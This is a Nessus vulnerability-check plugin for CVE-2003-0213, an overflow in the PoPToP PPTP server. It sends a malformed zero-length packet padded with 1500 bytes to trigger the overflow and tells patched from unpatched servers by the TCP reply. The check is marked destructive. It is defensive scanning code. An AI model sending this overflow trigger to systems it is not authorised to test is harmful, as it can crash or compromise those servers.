#
# This script was written by Xue Yong Zhi<xueyong@udel.edu>
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title, changed family (8/19/09)


include("compat.inc");

if (description)
{
 script_id(11540);
 script_version ("$Revision: 1.22 $");

 script_cve_id("CVE-2003-0213");
 script_bugtraq_id(7316);
 script_osvdb_id(3293);
 script_xref(name:"SuSE", value:"SUSE-SA:2003:029");

 script_name(english:"PoPToP PPTP ctrlpacket.c Negative Read Remote Overflow");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code may be run on the remote server." );
 script_set_attribute(attribute:"description", value:
"The remote PPTP server has remote buffer overflow vulnerability. 
The problem occurs due to insufficient sanity checks when referencing 
user-supplied input used in various calculations. As a result, it may
be possible for an attacker to trigger a condition where sensitive 
memory can be corrupted. Successful exploitation of this issue may
allow an attacker to execute arbitrary code with the privileges of 
the affected server." );
 script_set_attribute(attribute:"solution", value:
"The vendor has released updated releases of PPTP server that address 
this issue. Users are advised to upgrade as soon as possible." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Poptop Negative Read Overflow');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/04/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/04/09");
 script_cvs_date("$Date: 2012/12/17 23:26:10 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:poptop:pptp_server");
script_end_attributes();

 script_summary(english:"Determine if a remote PPTP server has remote buffer overflow vulnerability");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"Gain a shell remotely");
 script_copyright(english:"This script is Copyright (C) 2003-2012 Xue Yong Zhi & Tenable Network Security, Inc.");
 script_dependencie("pptp_detect.nasl");
 script_require_ports("Services/pptp",1723);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("byte_func.inc");

port = get_kb_item("Services/pptp");
if ( !port) exit(0);

set_byte_order(BYTE_ORDER_BIG_ENDIAN);

pptp_head =	mkword(1) +			# Message Type
        	mkdword(0x1a2b3c4d) +		# Cookie
 		mkword(1) +			# Control type (Start-Control-Connection-Request)
		mkword(0) +			# Reserved
		mkword(0x0100) +		# Protocol Version (1.0)
  		mkword(0) +			# Reserved
		mkdword(1) +			# Framing Capabilities
		mkdword(1) +			# Bearer capabilities
		mkword(0);			# Maximum channels
pptp_vendor = mkword(NASL_LEVEL) +		# Firmware revision 
	      mkpad(64) +			# Hostname 
	      mkpad(64);			# Vendor


buffer = mkword(strlen(pptp_head) + strlen(pptp_vendor) + 2) + pptp_head + pptp_vendor;

soc = open_sock_tcp(port);
if ( ! soc ) exit(0);
send(socket:soc, data:buffer);
r = recv(socket:soc, length:2);
if ( ! r || strlen(r) != 2 ) exit(0);
l = getword(blob:r, pos:0); 
r += recv(socket:soc, length:l - 2, min:l - 2);
if ( strlen(r) != l ) exit(0);
if ( strlen(r) < strlen(pptp_head) + strlen(pptp_vendor) ) exit(0);

cookie = getdword(blob:r, pos:4);
if ( cookie != 0x1a2b3c4d ) exit(0);


soc = open_sock_tcp(port);
if (soc)
 {
  send(socket:soc, data:buffer);
  rec_buffer = recv(socket:soc, length:156);
  close(soc);
  if("linux" >< rec_buffer)
	{
	buffer = 
	raw_string(0x00, 0x00) +
	# Length = 0

	crap(length:1500, data:'A');
	# Random data
 	soc = open_sock_tcp(port);
 	if (soc)
	 {
  	send(socket:soc, data:buffer);

        # Patched pptp server will return RST(will not read bad data), 
  	# unpatched will return FIN(read all the bad data and be overflowed).
 
	if ( defined_func("get_source_port") )
  	filter = string("tcp and src host ", get_host_ip(), " and dst host ", this_host(), " and src port ", port, " and dst port ", get_source_port(soc), " and tcp[13:1]&1!=0 " );
	else
  	filter = string("tcp and src host ", get_host_ip(), " and dst host ", this_host(), " and src port ", port, " and tcp[13:1]&1!=0 " ); 

	  for(i=0;i<5;i++) {
   		 r = pcap_next(pcap_filter:filter, timeout:2);
    		if(r)  {security_hole(port); exit(0);} 
                }
         }
    }
}
